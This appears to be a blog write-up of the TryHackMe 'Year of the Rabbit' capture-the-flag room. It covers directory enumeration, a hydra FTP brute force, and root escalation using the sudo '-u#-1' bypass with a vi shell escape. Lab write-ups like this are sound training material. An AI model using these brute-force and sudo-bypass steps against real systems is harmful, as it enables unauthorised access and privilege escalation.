---
layout: post
permalink: /posts/thm/year-of-the-rabbit
title: "Year of the Rabbit"
---

Let's start our enumeration with nmap.

```
nmap -sC -sV <TARGET-IP>
```

![nmap](/assets/images/thm/year-of-the-rabbit/nmap.png)

We can see that there are open ports 21 ftp, 22 ssh and 80 http. Let's try to find any hidden directories with gobuster.

```
gobuster dir -u http://<TARGET-IP>/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
```

While we are waiting for gobuster result, we can visit the web server.

![website](/assets/images/thm/year-of-the-rabbit/website.png)

It's just the Apache default page. Gobuster has finished the scan and here is the result.

![gobuster](/assets/images/thm/year-of-the-rabbit/gobuster.png)

Let's visit the `assets` directory.

![assets](/assets/images/thm/year-of-the-rabbit/assets.png)

Looking through the css file we have found another hidden directory.

![css](/assets/images/thm/year-of-the-rabbit/css.png)

Once we visit this page a pop up appears that told us to turn off the java script and it redirects us to an youtube video. We can download th source code with the following command:

```
wget http://<TARGET-IP>/sup3r_s3cr3t_fl4g.php
```

I fired up the Burp Suite and I visited /sup3r_s3cr3t_fl4g.php again. Capturing the request with burp we have found something interesting.

![burp-hidden](/assets/images/thm/year-of-the-rabbit/burp-hidden.png) 

Let's visit this hidden directory.

![hidden-directory](/assets/images/thm/year-of-the-rabbit/hidden-directory.png)

The directory contains an image.

![image](/assets/images/thm/year-of-the-rabbit/image.png)

Download the image, probably there is something hidden in it.

```
strings Hot_Babe.png
```

The command above shows us some hidden information.

![strings](/assets/images/thm/year-of-the-rabbit/strings.png)

Now we know the username for FTP. Copy all the found passwords and create a new file. Once this is done we can use hydra to brute force the FTP.

```
hydra -l ftpuser -P passwords ftp://<TARGET-IP>

![hydra](/assets/images/thm/year-of-the-rabbit/hydra.png)

Now we have the credentials for FTP. Let's login.

```
ftp <TARGET-IP>
```

![ftp](/assets/images/thm/year-of-the-rabbit/ftp.png)

We can download files from FTP with `get` command

```
get <FILE-NAME>
```

Open the file.

![brain-fuck](/assets/images/thm/year-of-the-rabbit/brain-fuck.png)

Wow... it's something bizarre, right? It's a `Brainfuck` an esoteric programming language created in 1993 by Urban Müller. We can use this `https://www.dcode.fr/brainfuck-language` site to decode it.

![decode](/assets/images/thm/year-of-the-rabbit/decode.png)

Now we have SSH credentials, let's login.

![ssh](/assets/images/thm/year-of-the-rabbit/ssh.png)

Hmm... we are greeted with a clue. We are not able to do almost anything with the current user, let's find this hidden message.

```
locate s3cr3t
```

Once we know where is the secret we can read it.

![secret](/assets/images/thm/year-of-the-rabbit/secret.png)

Switch to the gwendoline account.

```
su gwendoline
```

Now we are able to view the first flag. To find the root's flag we need to escalate our privileges. Let's check whether gwendoline is able to run any commands as root.

```
sudo -l
```

![sudo-l](/assets/images/thm/year-of-the-rabbit/sudo-l.png)

We are able to run `/usr/bin/vi /home/gwendoline/user.txt` as all users except root. After some research I have found the following exploit `https://www.exploit-db.com/exploits/47502`. Basically, this flaw allows us to run a command as root by specifying the target user using the numeric id of -1.

```
 sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Based on `https://gtfobins.github.io/gtfobins/vi/` once it opens the vi editor execute the following command.

```
:!/bin/sh
```

![bin-sh](/assets/images/thm/year-of-the-rabbit/bin-sh.png)

It'll open a root shell.

![root](/assets/images/thm/year-of-the-rabbit/root.png)

Now we are able to read the root's flag.